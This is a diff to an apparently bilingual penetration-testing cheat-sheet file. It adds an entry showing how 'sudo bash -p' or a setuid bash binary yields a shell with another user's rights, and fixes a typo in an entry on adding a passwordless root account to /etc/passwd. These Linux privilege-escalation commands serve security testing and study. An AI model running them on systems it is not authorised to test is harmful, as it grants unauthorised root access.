@@ -290,6 +290,29 @@ Many processes allow to launch a shell. Perfect with sudo or a setUID bit.
 Reference: https://gtfobins.github.io/
 "
 
+[bash]
+id=bash
+category=PrivEscUx
+keywords=
+title=Bash: shell
+desc="Bash permet d'ouvrir un shell avec les droits d'un autre utilisateur.   
+Sudo   
+<pre><code>sudo bash -p
+</code></pre>
+Setuid bit positionné   
+<pre><code>./bash -p
+</code></pre>
+"
+title_en=Bash: shell
+desc_en="Bash can spawn a shell with another user rights.   
+Sudo   
+<pre><code>sudo bash -p
+</code></pre>
+Setuid bit set   
+<pre><code>./bash -p
+</code></pre>
+"
+
 [etcpasswd]
 id=etcpasswd
 category=PrivEscUx
@@ -302,7 +325,7 @@ Ajoutez une entrée avec un UID de 0, et un mot de passe vide.
 su myroot 
 </code></pre>
 "
-title_en=Add a password less account with root rights
+title_en=Add a passwordless account with root rights
 desc_en="
 If you have the rights to modify /etc/passwd, you can be root. For example tee with a sudo as root.
 Add an entry with a UID of 0 (root UID), and an empty password.
